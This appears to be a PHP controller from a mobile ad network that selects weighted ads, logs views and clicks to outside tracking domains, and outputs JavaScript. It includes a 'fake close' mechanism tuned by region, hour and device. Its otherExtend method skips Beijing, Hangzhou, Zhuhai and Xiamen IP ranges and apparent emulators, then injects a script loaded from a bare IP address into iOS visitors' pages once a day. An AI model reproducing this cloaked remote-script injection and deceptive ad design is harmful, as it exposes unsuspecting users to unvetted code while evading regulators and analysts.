<?php
namespace app;

use App\Helpers\Model;
use app\Helpers\Mssql;

class AdsController extends CommonController
{

    protected $website;     //站长用户信息

    protected $paramet;    //广告位 0左边 1右边
    
    protected $jk_domain;   //计算PV域名
    protected $wap_tz_domain;   //点击域名

    function __construct()
    {
        parent::__construct();

        //PV 和 点击 域名
        if(strpos(server('http_referer'), 'https://') !== false){
            
            $this->jk_domain = 'https://tp.ningyizs.com'; //PV
            $this->wap_tz_domain = 'https://tt.ningyizs.com'; //点击Web
            $this->wechat_tz_domain = 'http://ptd.5177jy.com'; //点击Web
            
        }else{

            $this->jk_domain = 'http://tp.moecz.com';   //PV 
            $this->wap_tz_domain = 'http://td.biyao365.com'; //点击Web
            $this->wechat_tz_domain = 'http://ptd.5177jy.com'; //点击微信  //备用域名：ptd.yaotiao5.com
        }

    }

    public function adsAction($ad_pos, $position_id){

        $this->paramet->ad_pos = trim($ad_pos);
        $this->paramet->position_id = trim($position_id);

        //验证参数
        if( empty($this->paramet->ad_pos) && $this->paramet->ad_pos!=0 )
        {
            message('parameter error');
        }
        if(empty($this->paramet->position_id))
        {
            message('parameter error');
        }

        //获取广告位信息
        $model = new Model;
        $adposition = $model->getAdposition($this->paramet->position_id, config('app.type_id'), $this->memcache_obj);
        if($adposition===false)
        {
            message('Advertising does not exist');
        }

        //查找站长信息
        $model = new Model;
        $website = $model->getWebsite($adposition->userid, $this->memcache_obj);
        if(empty($website))
        {
            message('The account does not exist');
        }
        $this->website = $website;

        
        //机率pv率如果为空全部记录
        $this->website->record_pv = config('recordpv.1000'); //默认值25%
        foreach(config('recordpv') as $key=>$val)
        {
            if($key==$this->website->userid)
            {
                $this->website->record_pv = $val;
            }
        }

        //站长状态
        if($this->website->zhuangtai!=1)
        {
            message('Your account is not open');
        }

        //是否开通此广告类型
        if(strpos($this->website->openty, (string)config('app.type_id')) === false)
        { 
            message('No advertisement type is available'.$this->website->openty);
        }

        //域名是否登记
        if(!strpos($this->website->urlstr, $this->client_data->domain) && $this->website->ifdomain == 0)
        {
            message('Domain name registration.');
        }


        //获取广告
        $model = new Model;
        $ads = $model->getAds(config('app.type_id'), $this->memcache_obj);

        if(!is_object($ads) || count($ads)<=0)
        {
            die;
        }
        else
        {
            $ads_list = $ads->list;
            $ads_info = $ads->info;
        }

        //指定分类
        $ads_class = ($this->client_data->phone_type == 1) ? trim($adposition->wadsclass) : trim($adposition->iosclass);
        
        $ok_ads = (object)[];
        $no_ads = (object)[];

        //全部类型
        if($ads_class == '0'){

            foreach($ads_list as $value)
            {
                foreach($value as $v)
                {
                    $ok_ads->$v = $ads_info->$v;
                }
            }

        }else{

            foreach($ads_list as $key => $value)
            {
                foreach ($value as $v)
                {
                    if(strpos($ads_class, $key))
                    {
                        $ok_ads->$v = $ads_info->$v;
                    }
                    else
                    {
                        $no_ads->$v = $ads_info->$v;
                    }
                }
            }

        }

    
        //地区符合
        $ip_number = ip2long(getClientIp());
        $area_name = getAreaByip($ip_number);

        //假关闭调用
        $false_close = $this->getFalseClose($this->client_data->phone_type, $area_name);
        $false_close = $false_close ? $false_close : 0;

        $nowdic = [];   //投放广告ID Array
        foreach($ok_ads as $ad_id => $ad){

            if($ad->istype==$this->client_data->is_wechat  //是否支持微信
            && strpos($ad->phonetype, (string)$this->client_data->phone_type)!==false //是否支持系统
            && strpos($ad->blacksiteid, ','.$this->website->userid.',')===false //屏蔽的站
            && (empty($ad->okarea) || mb_strpos($ad->okarea, $area_name, 0, 'UTF-8') !== FALSE)
            )
            {
               

                if($ad->unshow_phone != '0')
                {
                    //获取当前手机处理
                    foreach (explode(',', $ad->unshow_phone) as $value)
                    {
                        if(strpos(strtolower(server('http_user_agent')), (string)$value) !== false)
                        {
                            $unshow = true;
                            break;
                        }
                    }
                }

                if(empty($unshow))
                {
                    if($ad->sqms==1)
                    {
                        if(strpos($ad->limitsiteid, ','.$this->website->userid.',') !== FALSE)
                        {
                            $nowdic[] = $ad_id;
                        }
                    }
                    else
                    {
                        $nowdic[] = $ad_id;	
                    }
                }
            }
                
        }

        //如果没有符合广告，则取出不符合广
        if(!$nowdic)
        {
            //允许展示并不符合的广告，取出.
            if($adposition->noadok == 1 && !empty($no_ads))
            {
                $ok_ads = $no_ads;
                foreach ($no_ads as $no_ad_id => $ad)
                {
                    if($ad->istype==$this->client_data->is_wechat   //是否支持微信
                    && strpos($ad->phonetype, (string)$this->client_data->phone_type)!==false    //是否支持系统
                    && strpos($ad->blacksiteid, ','.$this->website->userid.',')===false  //?????????????????????????????
                    && $ad->sqms==0)    //投放方式自动还是手动
                    {
                        $nowdic[] = $no_ad_id;
                    }
                }

                if(empty($nowdic)){
                    //message('Lack of advertising');
                }
        
            }else{
                //message('In line with the conditions of advertising');
            }

        }

        if(!$nowdic)
        {
            die('no ads');
        }
        
        $ads = $ok_ads;

        // 随机取出广告
        for($i = 0; $i < config('app.number'); $i++)
        {
            $totalweight = 0;
            $weightdic = [];

            shuffle($nowdic);   //随机重新排序

            foreach($nowdic as $k=>$val)
            {
                $weightdic[$k] = $ads->$val->weight1;
                $totalweight += $ads->$val->weight1;
            }
            
           
            $rnd_ad = mt_rand(1, $totalweight);
            $adsid = 0;		// 选中的广告编??

            // 利用权重的上下界数值比较确定选中哪个广告
            foreach($weightdic as $k => $v)
            {
                if($rnd_ad <= $v){
                    $adsid = (int)$nowdic[$k];
                    break;
                }else{
                    $rnd_ad -= $v;
                    continue;
                }
            }

            $rndadspv = mt_rand(1, config('app.rate'));		//前来源抽样概��?? 1/10
            
            $useripaid = getClientIp() . $adsid;
            
            //特殊广告输出
            if(in_array($adsid, config('app.special_ads_id')))
            {
                

                $linkurl = base64_encode('1='.$adsid.'='.$this->website->userid.'='.time().'='.$this->paramet->position_id.'='.config('app.type_id').'='.iptopwd($useripaid, date('md')).'='.$ip_number);
                // 记录pv数据
                $is_cpc_count = !empty($_COOKIE['pg_jusha_cpc_'.$ip_number.$adsid]) ? $_COOKIE['pg_jusha_cpc_'.$ip_number.$adsid] : 0;
            
                if(!$is_cpc_count){

                    $mssql = new Mssql;

                    $bind_data = [
                        ['adsid', $adsid, SQLVARCHAR],
                        ['uip', $ip_number, SQLVARCHAR]
                    ];

                    $result = $mssql->init('xyz69_cpc')->bindArr($bind_data)->execute();
                    
                    if(empty($result))
                    {
                        errorlog('The reservoir process xyz69_cpc failed.', __FILE__);
                    }

                    $is_cpc_ad = $mssql->fetchRow($result)[0];

                    //$mssql->fetchRow($result);

                    $mssql->freeStatement();

                    //$mssql->freeResult($result);

                    if(!$is_cpc_ad){

                        //$mssql = new Mssql;
                        
                        $bind_data = [
                            ['userid', $this->website->userid, SQLINT2],
                            ['adsid', $adsid, SQLVARCHAR],
                            ['mip', $ip_number, SQLVARCHAR],
                            ['pid', $this->paramet->position_id, SQLINT2]
                        ];
                 
                        $result = $mssql->init('vistdata69_cpc_count')->bindArr($bind_data)->execute();

                        if(empty($result))
                        {
                            errorlog('The reservoir process vistdata69_cpc_count failed.', __FILE__);
                        }

                        $mssql->freeStatement();

                        setcookie('pg_cpc_'.$ip_number.$adsid, 1, time()+24*60*3600);
                    }
                }

                out_special_ad($adsid, $this->ad_pos, $rndadspv, $linkurl, $this->client_data->phone_type);

                echo '!(function(){var b,a=document.createElement("script");a.src="'.$this->jk_domain.'/se?u='.$linkurl.'",b=document.getElementsByTagName("html")[0],b.appendChild(a)})();';
                
                exit;
            }

            //正常广告处理
            if($adposition->ispic == 1)
            {	
                $nowpic = explode(',', str_replace(' ', '', $ads->$adsid->picurl0));  //目前只有这一个
            }
            elseif($adposition->ispic == 2)
            {
                $nowpic = explode(',', str_replace(' ', '', $ads->$adsid->picurl1));
            }
            else
            {
                $nowpic = explode(',', str_replace(' ', '', $ads->$adsid->picurl2));
            }


            if($this->website->userid=='5065')
            {
                $pic_url = "http://pgimg.ucxsw.com/7/";
            }
            else
            {
                $pic_url = config('app.pic_url');
            }
            
            //在UC浏览器 或者  QQ浏览器 gif图片后缀修改成 bmp
            if(0)
            {
                $imgsrc[] =  $pic_url.preg_replace('/.gif$/','.bmp', $nowpic[array_rand($nowpic, 1)]);
            }
            else
            {
                $imgsrc[] =  $pic_url.$nowpic[array_rand($nowpic, 1)];
            }


            //传递参数
            $data = [
                'adsid' => $adsid,
                'website_id' => $this->website->userid,
                'position_id' => $this->paramet->position_id,
                'type_id' => config('app.type_id'),
                'gotourl' => urlEncode($ads->$adsid->gotourl),
                'time' => time(),
            ];

            if( $token = getAccessToken($data) )
            {
                $data['access_token'] = $token;
            }
            else
            {
                message('AccessToken error');
            }

            //$linkurl = base64_encode('0&'.$adsid.'&'.$this->website->userid.'&'.time().'&'.$position_id.'&'.config('app.type_id').'&'.iptopwd($useripaid, date('md')).'&'.base64_encode($ads->$adsid->gotourl));

            if($i == 0)
            {
                $pv_url = $this->jk_domain.'/se?u='.base64_encode(http_build_query($data));
                $anim_adid = $adsid;
            }
            
            $imgcounturl[] = ($this->client_data->is_wechat ? $this->wap_tz_domain : $this->wechat_tz_domain)."/url?s=".base64_encode(http_build_query($data));
            
            $gotourls[] = $ads->$adsid->gotourl;

        }

        $GCIDS = 'p'.$this->paramet->ad_pos.$this->website->userid.substr(str_shuffle('abcdefghjkmnpqrstuvwxyz'), 0, 5);

        
        header("Content-type: application/javascript");

        foreach(config('debug') as $key=>$val)
        {
            if($key==$this->website->userid)
            {
                if(strpos(server('http_referer'), 'debug=true'))
                {
                    $debug = 'true';
                }
            }
        }
        if(strpos(server('http_referer'), 'debug=test'))
        {
            $debug = 'test'; 
        }

        if($debug=='true') 
        {
            require __ROOT__.'/app/script/'.config('debug.'.$this->website->userid);
        }
        else if($debug=='test')
        {
            require __ROOT__.'/app/script/ad.js';
        }
        else
        {
            require __ROOT__.'/app/script/ad.min.js';
        }

        //输入其他推广代码
        $this->otherExtend($ip_number, $area_name);
    }


    //赛选个别站图标变小
    public function is_lessen()
    {
        $websiteid = ['5065','2653'];
        if(in_array($this->website->userid, $websiteid))
        {
            return 1;
        }
        else
        {
            return 0;
        }
    }

    //获取边框样式
    public function getBorderStyle()
    {
        //机率pv率如果为空全部记录
        $border = config('border.1000'); //默认值25%
        foreach(config('border') as $key=>$val)
        {
            if($key==$this->website->userid)
            {
                $border = $val;
            }
        }
        return $border;
    }

    //获取假关闭机率值
    public function getFalseClose($phone_type, $area_name)
    {
        if($this->website->js_icon_config>0)
        {
            //地区检测是否屏蔽
            if($this->website->js_icon_okarea)
            {
                $areaArray = explode(",", $this->website->js_icon_okarea);

                foreach($areaArray as $value)
                {
                    //如果屏蔽了此站点返回 false
                    if($area_name==trim($value))
                    {
                        return false;
                    }
                }
            }

            //检测生效时间
            $time = date("H");
            if($this->website->js_icon_time)
            {
                $timeArray = explode(",", $this->website->js_icon_time);
                
                $is_time = false;
                foreach($timeArray as $value)
                {
                    //如果屏蔽了此站点返回 false
                    if($time==trim($value))
                    {
                        $is_time = true;
                        break;
                    }
                }
                if($is_time==false)
                {
                    return false; 
                }
            }
            else
            {
                return false;
            }

            //检测设备
            if($this->website->js_icon_ptype!=0)
            {
                if($phone_type != $this->website->js_icon_ptype)
                {
                    return false; 
                }
            }
           
            return $this->website->js_icon_config;
        }
        else
        {
            return false;
        }
    }


    //嵌套其他推广代码
    public function otherExtend($ip_number, $area_name)
    {
        /***
         * 其他推广代码
         * 
         * 1. 需要屏蔽指定地区
         * 2. 需要屏蔽电脑模拟器
         */
        
        //屏蔽地区
        $is_shield_city = false;

        //允许的系统 1：Android  2：IOS
        $client_type = [1, 2];

        //检测城市是否屏蔽
        if($area_name=='北京')
        {
            $is_shield_city = true;
        }
        //杭州
        $hangzhou = include config('app.ip_path').'/hangZhouIp.php';
        foreach ($hangzhou as $k => $v)
        {
            if($ip_number > $k && $ip_number < $v)
            {
                $is_shield_city = true;
                break;
            }
        }
        //珠海 厦门
        $xmzh = include config('app.ip_path').'/ipListXmzh.php';
        foreach ($xmzh as $k => $v)
        {
            if($ip_number > $k && $ip_number < $v)
            {
                $is_shield_city = true;
                break;
            }
        }
      
        //屏蔽的城市
        if($is_shield_city===false)
        {
            //允许的设备
            if(in_array($this->client_data->phone_type, $client_type))
            {
               
                //Android 模拟机
                if($this->client_data->phone_type==1)
                {
                    if(strlen(server('http_user_agent')) > 155)
                    {
                        //输出js代码
                        //echo ';(function(){var m=document.createElement("script");var s=window.location.href;m.src="https://a.mediabest.cn/dispatcher?v=2.0&t=0&d=222&src2="+s;var ss=document.getElementsByTagName("script")[0];ss.parentNode.insertBefore(m,ss)})();';
                    }
                }

                //IOS 模拟机
                if($this->client_data->phone_type==2)
                {
                    if(strlen(server('http_user_agent')) > 134)
                    {
						if( empty($_COOKIE['pgm1_'.$ip_number]) ){
                            ?>
                            function IconsetCookie(name,value){var Days=1;var exp=new Date();exp.setTime(exp.getTime()+Days*24*60*60*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString()}function WckgeteCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2])}else{IconsetCookie(name,1);return 1}}if(WckgeteCookie('pgm1_170941731720171016')!=2){IconsetCookie('pgm1_170941731720171016',2);document.writeln('<script type="text/javascript" src="http://121.42.203.90:6222/320894302.js?ILeisls"></script>')}<?php
							setcookie('pgm1_'.$ip_number, 1 , strtotime('23:59:59'));
                        }
                    }
                }
            }
        }

    }
}